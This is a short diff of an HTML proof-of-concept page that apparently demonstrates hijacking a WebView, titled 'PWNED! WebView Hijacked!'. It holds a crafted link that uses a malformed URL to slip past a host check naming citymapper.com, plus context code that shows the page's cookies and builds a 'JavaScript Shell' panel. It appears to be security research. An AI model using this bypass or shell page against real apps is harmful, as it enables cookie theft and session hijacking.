@@ -2,9 +2,7 @@
 <html>
     <head>
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>PWNED! WebView Hijacked!</title>
-        <h2>LINK:</h2>
-        <a href="https://cloudofdarkness.github.io://?citymapper.com">CLICK</a>
+        <title><a href="https://cloudofdarkness.github.io://?citymapper.com">CLICK</a></title>
     </head>
     <body>
       loading... JS Required...
@@ -73,6 +71,8 @@
   originText += `document.cookie = ${document.cookie}\n`;
   originText += `window.navigator.appVersion = ${window.navigator.appVersion}\n`;
   originDiv.innerText = originText;
+
+
 
   const header_el = header('JavaScript Shell', RED);
   const vars_el = document.createElement('div');
